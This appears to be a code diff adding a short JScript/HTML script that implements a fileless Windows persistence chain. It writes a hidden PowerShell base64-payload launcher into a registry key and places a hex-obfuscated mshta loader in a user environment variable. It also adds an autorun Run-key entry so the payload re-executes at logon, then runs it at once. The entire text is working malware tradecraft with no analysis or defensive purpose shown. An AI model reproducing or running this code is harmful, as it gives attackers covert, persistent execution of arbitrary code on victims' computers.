@@ -1,0 +1,14 @@
+<script>
+var exec_command = "var shell = new ActiveXObject('WScript.Shell'); shell.Run('powershell.exe -WindowStyle Hidden /c \"$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\\'<B64-Payload>\\')); Invoke-Expression $payload\"')"
+var call_reg_command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c \"Invoke-Expression $Env:LOTL_VAR\""
+// same code in call_reg.js
+var env_code = "mshta.exe 'javascript:eval(\"\\x76\\x61\\x72\\x20\\x73\\x3d\\x6e\\x65\\x77\\x20\\x41\\x63\\x74\\x69\\x76\\x65\\x58\\x4f\\x62\\x6a\\x65\\x63\\x74\\x28\\x22\\x57\\x53\\x63\\x72\\x69\\x70\\x74\\x2e\\x53\\x68\\x65\\x6c\\x6c\\x22\\x29\\x3b\\x76\\x61\\x72\\x20\\x72\\x3d\\x73\\x2e\\x52\\x65\\x67\\x52\\x65\\x61\\x64\\x28\\x22\\x48\\x4b\\x43\\x55\\x5c\\x5c\\x53\\x6f\\x66\\x74\\x77\\x61\\x72\\x65\\x5c\\x5c\\x4c\\x4f\\x54\\x4c\\x5c\\x5c\\x4c\\x4f\\x54\\x4c\\x5c\\x5c\\x4c\\x4f\\x54\\x4c\\x5f\\x4b\\x65\\x79\\x22\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x72\\x29\\x3b\")'"
+
+var shell = new ActiveXObject("WScript.Shell");
+//set environment variable
+shell.Environment("User").Item("LOTL_VAR") = env_code
+shell.RegWrite("HKCU\\Software\\LOTL\\LOTL\\LOTL_Key", exec_command, "REG_SZ");
+shell.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\LOTL", call_reg_command, "REG_SZ")
+shell = null;
+eval(exec_command)
+</script>
